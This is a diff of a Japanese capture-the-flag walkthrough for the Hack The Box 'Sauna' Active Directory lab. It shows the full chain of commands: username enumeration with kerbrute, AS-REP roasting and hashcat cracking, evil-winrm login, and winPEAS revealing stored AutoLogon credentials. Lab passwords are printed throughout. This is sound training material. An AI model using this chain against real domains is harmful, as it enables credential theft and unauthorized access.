@@ -59,14 +59,11 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 66.47 seconds
 ```
 
+
 ## STEP 2
-ドメインを取得できた
-```sh
-└─$ netexec ldap 10.129.95.180 -u '' -p '' --get-sid                                          
-LDAP        10.129.95.180   389    SAUNA            [*] Windows 10 / Server 2019 Build 17763 (name:SAUNA) (domain:EGOTISTICAL-BANK.LOCAL)
-LDAP        10.129.95.180   389    SAUNA            [+] EGOTISTICAL-BANK.LOCAL\: 
-LDAP        10.129.95.180   389    SAUNA            Domain SID
-```
+80番にアクセス、従業員っぽい名前を確認
+<img src="https://github.com/mylovemyon/hackthebox_images/blob/main/Sauna_01.png">  
+従業員の名前をメモ
 ```sh
 └─$ cat userlist.txt 
 Fergus Smith
@@ -76,6 +73,7 @@ Bowie Taylor
 Sophie Driver
 Steven Kerb
 ```
+ワードリストを作成
 ```sh
 └─$ ./username-anarchy -i userlist.txt > user.txt
 
@@ -91,9 +89,16 @@ fsmith
 sfergus
 s.fergus
 ```
-kerberos認証をブルートフォースし、有効なユーザを探す
+クレデンシャルなしでドメイン名「EGOTISTICAL-BANK.LOCAL」を確認
 ```sh
-└─$ ../kerbrute_linux_amd64 userenum --dc '10.129.95.180' -d 'EGOTISTICAL-BANK.LOCAL' user.txt               
+└─$ netexec ldap 10.129.95.180 -u '' -p '' --get-sid                                          
+LDAP        10.129.95.180   389    SAUNA            [*] Windows 10 / Server 2019 Build 17763 (name:SAUNA) (domain:EGOTISTICAL-BANK.LOCAL)
+LDAP        10.129.95.180   389    SAUNA            [+] EGOTISTICAL-BANK.LOCAL\: 
+LDAP        10.129.95.180   389    SAUNA            Domain SID
+```
+先ほどのリストを用いてユーザ名を確認したところ、「fsmith」を発見
+```sh
+└─$ ./kerbrute_linux_amd64 userenum --dc '10.129.95.180' -d 'EGOTISTICAL-BANK.LOCAL' user.txt               
 
     __             __               __     
    / /_____  _____/ /_  _______  __/ /____ 
@@ -109,13 +114,13 @@ Version: v1.0.3 (9dad6e1) - 07/29/25 - Ronnie Flathers @ropnop
 2025/07/29 02:08:04 >  [+] VALID USERNAME:       fsmith@EGOTISTICAL-BANK.LOCAL
 2025/07/29 02:08:10 >  Done! Tested 88 usernames (1 valid) in 6.058 seconds
 ```
-fsmithは、asreproastできた
+asreproastにより、fsmith のtgsをゲット
 ```sh
 └─$ sudo ntpdate 10.129.95.180                                                                                                  
 2025-07-29 09:27:00.899816 (-0400) +25200.607821 +/- 0.170160 10.129.95.180 s1 no-leap
 CLOCK: time stepped by 25200.607821
 
-└─$ netexec ldap 10.129.95.180 -u 'EGOTISTICAL-BANK.LOCAL\fsmith' -p '' --kdcHost 10.129.95.180 --asreproast asreproast.txt
+└─$ netexec ldap 10.129.95.180 -u 'EGOTISTICAL-BANK.LOCAL\fsmith' -p '' --asreproast asreproast.txt
 LDAP        10.129.95.180   389    SAUNA            [*] Windows 10 / Server 2019 Build 17763 (name:SAUNA) (domain:EGOTISTICAL-BANK.LOCAL)
 LDAP        10.129.95.180   389    SAUNA            $krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:1795fcc8fbfb3ecf9ee579038a750bf0$962b94cb5f32cd7cbc367102f9cf919d2948118e444f7f68312dd04460340337115005ac6d7c1c4c0ebfb7d4643d45a63557645f3955f537c214339d1bbb342b05c385c23b22701cdf923efd2bd41cbbb930dbb087ea5af79aaaf64be20294a9f0285e067c91f6edc355a9894ca9f0988557a17dc024cc64ac3bfa98c050905afde3fa48da9ab4b0d272412f624e3bb6d770a08d8e969695777ba288967302d5c384d3fc6fc70a68dd9826e82552f2db655890c3c7965b4e67ff9344c1b4fed86ed27e682e79e11598c374947637b8f2d865ce0725bf58d0d486af0a863c06880911592fa01cb5d9760df94ab7ebb536ed6dabe3d01f85b1d22be62530629bb5
 ```
@@ -133,6 +138,263 @@ Kerberos 5 AS-REP etype 23, HC: 18200 Summary: Used for Windows Active Directory
 └─$ hashcat -a 0 -m 18200 asreproast.txt /usr/share/wordlists/rockyou.txt --quiet                                      
 $krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:59bee1196843ecf6fcbfe16e736d2f2e$8f2dd9c5a07d9fee96a351010bafbd7c9d2de474aa5ec6925773990cd87534c81d01746c1aeb6a0481f8101b95081746247212fc3918899124294f7c123eb12216a599ce297c617c9d263e02e72d4c5e148e561af9281a549d8a79445ce0fc5c6a12dd97acee05a8225234eb6da2ec7ffe8821bc78225b9a645ca2bd4bceaa022a11d9550aaef0fe8be1c50271e9bbdc3d3bb8e4c381863a16472bcac8f7da8eccd8a1ad6e2b8c7abc3af275649b0b51bb11ea373a3e8b025c40f63eaae65931bc4c5ca37286093cc5034caabf53fd1a384144072569c8ee438fecb0c0f7db5e4a68cc76154807a459b0bf6640979310ce17ff1eb8f38052ef36ea9d6e827870:Thestrokes23
 ```
+5985番ポートが開いていたので、winrmログイン成功！ユーザフラグゲット
+```sh
+└─$ evil-winrm -i 10.129.95.180 -u fsmith -p Thestrokes23 
+                                        
+Evil-WinRM shell v3.7
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\FSmith\Documents> cat ../Desktop/user.txt
+5841274744d39246d6d26509fe76d42a
+```
+
+
+## STEP 3
+winpeasで権限昇格を探す  
+32ビットか64ビットで動かすか確認、systeminfoが拒否されたので.netで確認、64ビット版で実行しましょ
+```powershell
+*Evil-WinRM* PS C:\Users\FSmith\Documents> systeminfo
+Program 'systeminfo.exe' failed to run: Access is deniedAt line:1 char:1
++ systeminfo
++ ~~~~~~~~~~.
+At line:1 char:1
++ systeminfo
++ ~~~~~~~~~~
+    + CategoryInfo          : ResourceUnavailable: (:) [], ApplicationFailedException
+    + FullyQualifiedErrorId : NativeCommandFailed
+
+*Evil-WinRM* PS C:\Users\FSmith\Documents> [Environment]::Is64BitOperatingSystem
+True
+```
+winpeasを配送して、実行
+```sh
+└─$ cp /usr/share/peass/winpeas/winPEASx64.exe smb
+
+└─$ impacket-smbserver -smb2support share smb
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Config file parsed
+[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
+[*] Config file parsed
+[*] Config file parsed
+```
+```sh
+*Evil-WinRM* PS C:\Users\FSmith\Documents> copy \\10.10.16.12\share\winPEASx64.exe .
+
+*Evil-WinRM* PS C:\Users\FSmith\Desktop> .\winPEASx64.exe userinfo quiet
+ [!] If you want to run the file analysis checks (search sensitive information in files), you need to specify the 'fileanalysis' or 'all' argument. Note that this search might take several minutes. For help, run winpeass.exe --help
+ANSI color bit for Windows is not set. If you are executing this from a Windows terminal inside the host you should run 'REG ADD HKCU\Console /v VirtualTerminalLevel /t REG_DWORD /d 1' and then start a new CMD
+Long paths are disabled, so the maximum length of a path supported is 260 chars (this may cause false negatives when looking for files). If you are admin, you can enable it with 'REG ADD HKLM\SYSTEM\CurrentControlSet\Control\FileSystem /v VirtualTerminalLevel /t REG_DWORD /d 1' and then start a new CMD
+  WinPEAS-ng by @hacktricks_live
+
+       /---------------------------------------------------------------------------------\                                                                                                                                                  
+       |                             Do you like PEASS?                                  |                                                                                                                                                  
+       |---------------------------------------------------------------------------------|                                                                                                                                                  
+       |         Learn Cloud Hacking       :     training.hacktricks.xyz                 |                                                                                                                                                  
+       |         Follow on Twitter         :     @hacktricks_live                        |                                                                                                                                                  
+       |         Respect on HTB            :     SirBroccoli                             |                                                                                                                                                  
+       |---------------------------------------------------------------------------------|                                                                                                                                                  
+       |                                 Thank you!                                      |                                                                                                                                                  
+       \---------------------------------------------------------------------------------/                                                                                                                                                  
+                                                                                                                                                                                                                                            
+  [+] Legend:
+         Red                Indicates a special privilege over an object or something is misconfigured
+         Green              Indicates that some protection is enabled or something is well configured
+         Cyan               Indicates active users
+         Blue               Indicates disabled users
+         LightYellow        Indicates links
+
+ You can find a Windows local PE Checklist here: https://book.hacktricks.wiki/en/windows-hardening/checklist-windows-privilege-escalation.html
+   Creating Dynamic lists, this could take a while, please wait...                                                                                                                                                                          
+   - Loading sensitive_files yaml definitions file...
+   - Loading regexes yaml definitions file...
+   - Checking if domain...
+   - Getting Win32_UserAccount info...
+Error while getting Win32_UserAccount info: System.Management.ManagementException: Access denied
+   at System.Management.ThreadDispatch.Start()                                                                                                                                                                                              
+   at System.Management.ManagementScope.Initialize()                                                                                                                                                                                        
+   at System.Management.ManagementObjectSearcher.Initialize()                                                                                                                                                                               
+   at System.Management.ManagementObjectSearcher.Get()                                                                                                                                                                                      
+   at winPEAS.Checks.Checks.CreateDynamicLists(Boolean isFileSearchEnabled)                                                                                                                                                                 
+   - Creating current user groups list...
+   - Creating active users list (local only)...
+  [X] Exception: Object reference not set to an instance of an object.
+   - Creating disabled users list...
+  [X] Exception: Object reference not set to an instance of an object.
+   - Admin users list...
+  [X] Exception: Object reference not set to an instance of an object.
+   - Creating AppLocker bypass list...
+   - Creating files/directories list for search...
+        [skipped, file search is disabled]
+
+
+ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ¹ Users Information ÌÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ
+
+ÉÍÍÍÍÍÍÍÍÍÍ¹ Users
+È Check if you have some admin equivalent privileges https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#users--groups
+  [X] Exception: Object reference not set to an instance of an object.
+  Current user: FSmith
+  Current groups: Domain Users, Everyone, Builtin\Remote Management Users, Users, Builtin\Pre-Windows 2000 Compatible Access, Network, Authenticated Users, This Organization, NTLM Authentication
+   =================================================================================================
+
+    Not Found
+
+ÉÍÍÍÍÍÍÍÍÍÍ¹ Current User Idle Time
+   Current User   :     EGOTISTICALBANK\FSmith
+   Idle Time      :     03h:40m:26s:593ms
+
+ÉÍÍÍÍÍÍÍÍÍÍ¹ Display Tenant information (DsRegCmd.exe /status)
+   Tenant is NOT Azure AD Joined.
+
+ÉÍÍÍÍÍÍÍÍÍÍ¹ Current Token privileges
+È Check if you can escalate privilege using some enabled token https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#token-manipulation
+    SeMachineAccountPrivilege: SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED
+    SeChangeNotifyPrivilege: SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED
+    SeIncreaseWorkingSetPrivilege: SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED
+
+ÉÍÍÍÍÍÍÍÍÍÍ¹ Clipboard text
+
+ÉÍÍÍÍÍÍÍÍÍÍ¹ Logged users
+  [X] Exception: Access denied 
+    Not Found
+
+ÉÍÍÍÍÍÍÍÍÍÍ¹ Display information about local users
+   Computer Name           :   SAUNA
+   User Name               :   Administrator
+   User Id                 :   500
+   Is Enabled              :   True
+   User Type               :   Administrator
+   Comment                 :   Built-in account for administering the computer/domain
+   Last Logon              :   7/30/2025 9:37:14 AM
+   Logons Count            :   135
+   Password Last Set       :   7/26/2021 9:16:16 AM
+
+   =================================================================================================
+
+   Computer Name           :   SAUNA
+   User Name               :   Guest
+   User Id                 :   501
+   Is Enabled              :   False
+   User Type               :   Guest
+   Comment                 :   Built-in account for guest access to the computer/domain
+   Last Logon              :   1/1/1970 12:00:00 AM
+   Logons Count            :   0
+   Password Last Set       :   1/1/1970 12:00:00 AM
+
+   =================================================================================================
+
+   Computer Name           :   SAUNA
+   User Name               :   krbtgt
+   User Id                 :   502
+   Is Enabled              :   False
+   User Type               :   User
+   Comment                 :   Key Distribution Center Service Account
+   Last Logon              :   1/1/1970 12:00:00 AM
+   Logons Count            :   0
+   Password Last Set       :   1/22/2020 10:45:30 PM
+
+   =================================================================================================
+
+   Computer Name           :   SAUNA
+   User Name               :   HSmith
+   User Id                 :   1103
+   Is Enabled              :   True
+   User Type               :   User
+   Comment                 :
+   Last Logon              :   1/1/1970 12:00:00 AM
+   Logons Count            :   0
+   Password Last Set       :   1/22/2020 10:54:34 PM
+
+   =================================================================================================
+
+   Computer Name           :   SAUNA
+   User Name               :   FSmith
+   User Id                 :   1105
+   Is Enabled              :   True
+   User Type               :   User
+   Comment                 :
+   Last Logon              :   7/30/2025 10:41:58 AM
+   Logons Count            :   22
+   Password Last Set       :   1/23/2020 9:45:19 AM
+
+   =================================================================================================
+
+   Computer Name           :   SAUNA
+   User Name               :   svc_loanmgr
+   User Id                 :   1108
+   Is Enabled              :   True
+   User Type               :   User
+   Comment                 :
+   Last Logon              :   1/1/1970 12:00:00 AM
+   Logons Count            :   0
+   Password Last Set       :   1/24/2020 4:48:31 PM
+
+   =================================================================================================
+
+
+ÉÍÍÍÍÍÍÍÍÍÍ¹ RDP Sessions
+    Not Found
+
+ÉÍÍÍÍÍÍÍÍÍÍ¹ Ever logged users
+  [X] Exception: Access denied 
+    Not Found
+
+ÉÍÍÍÍÍÍÍÍÍÍ¹ Home folders found
+    C:\Users\Administrator
+    C:\Users\All Users
+    C:\Users\Default
+    C:\Users\Default User
+    C:\Users\FSmith : FSmith [Allow: AllAccess]
+    C:\Users\Public
+    C:\Users\svc_loanmgr
+
+ÉÍÍÍÍÍÍÍÍÍÍ¹ Looking for AutoLogon credentials
+    Some AutoLogon credentials were found
+    DefaultDomainName             :  EGOTISTICALBANK
+    DefaultUserName               :  EGOTISTICALBANK\svc_loanmanager
+    DefaultPassword               :  Moneymakestheworldgoround!
+
+ÉÍÍÍÍÍÍÍÍÍÍ¹ Password Policies
+È Check for a possible brute-force 
+    Domain: Builtin
+    SID: S-1-5-32
+    MaxPasswordAge: 42.22:47:31.7437440
+    MinPasswordAge: 00:00:00
+    MinPasswordLength: 0
+    PasswordHistoryLength: 0
+    PasswordProperties: 0
+   =================================================================================================
+
+    Domain: EGOTISTICALBANK
+    SID: S-1-5-21-2966785786-3096785034-1186376766
+    MaxPasswordAge: 42.00:00:00
+    MinPasswordAge: 1.00:00:00
+    MinPasswordLength: 7
+    PasswordHistoryLength: 24
+    PasswordProperties: DOMAIN_PASSWORD_COMPLEX
+   =================================================================================================
+
+
+ÉÍÍÍÍÍÍÍÍÍÍ¹ Print Logon Sessions
+
+       /---------------------------------------------------------------------------------\                                                                                                                                                  
+       |                             Do you like PEASS?                                  |                                                                                                                                                  
+       |---------------------------------------------------------------------------------|                                                                                                                                                  
+       |         Learn Cloud Hacking       :     training.hacktricks.xyz                 |                                                                                                                                                  
+       |         Follow on Twitter         :     @hacktricks_live                        |                                                                                                                                                  
+       |         Respect on HTB            :     SirBroccoli                             |                                                                                                                                                  
+       |---------------------------------------------------------------------------------|                                                                                                                                                  
+       |                                 Thank you!                                      |                                                                                                                                                  
+       \---------------------------------------------------------------------------------/  
+```
+
+## STEP 4
 ```sh
 └─$ netexec ldap 10.129.95.180 --dns-server '10.129.95.180' -u 'EGOTISTICAL-BANK.LOCAL\fsmith' -p 'Thestrokes23' --bloodhound --collection All
 LDAP        10.129.95.180   389    SAUNA            [*] Windows 10 / Server 2019 Build 17763 (name:SAUNA) (domain:EGOTISTICAL-BANK.LOCAL)
